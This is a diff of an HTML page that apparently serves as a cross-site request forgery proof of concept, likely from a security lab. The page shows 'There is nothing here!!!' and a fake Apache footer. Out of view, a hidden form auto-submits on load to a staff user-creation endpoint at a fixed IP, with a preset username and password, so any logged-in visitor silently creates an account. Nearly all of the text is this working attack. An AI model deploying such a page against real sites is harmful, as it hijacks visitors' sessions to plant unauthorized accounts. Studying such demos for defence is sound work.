@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 
@@ -12,21 +11,23 @@
 <body>
     <h1>Welcome</h1>
     <p>There is nothing here!!!</p>
+    <hr>
+    <address>Apache/2.4.18 (Ubuntu) Server at 104.198.208.81 Port 443</address>
     <div style="display: none">
-        <iframe name="F1z"></iframe>
-        <form action="https://104.198.208.81/red/public/staff/users/new.php" style="display: none" name="form1" method="POST"
-             target="F1z">
+        <iframe name="results"></iframe>
+        <form action="https://104.198.208.81/red/public/staff/users/new.php" style="display: none" id="form1" method="POST"
+            name="newuser" target="results">
             <input name="first_name" value="CSRFTEST">
             <input name="last_name" value="CSRFTEST">
             <input name="username" value="CSRFTEST">
             <input name="email" value="CSRFTEST@gmail.com">
             <input type="password" name="password" value=" uR#Bk5=B&S@4">
             <input type="password" name="confirm_password" value=" uR#Bk5=B&S@4">
-            <input type="submit"/>
+            <button id="myform" type="submit" form="form1" value="Create">Create</button>
         </form>
     </div>
     <script>
-        document.form1.submit();
+        document.getElementById("myform").click();
     </script>
 </body>
 
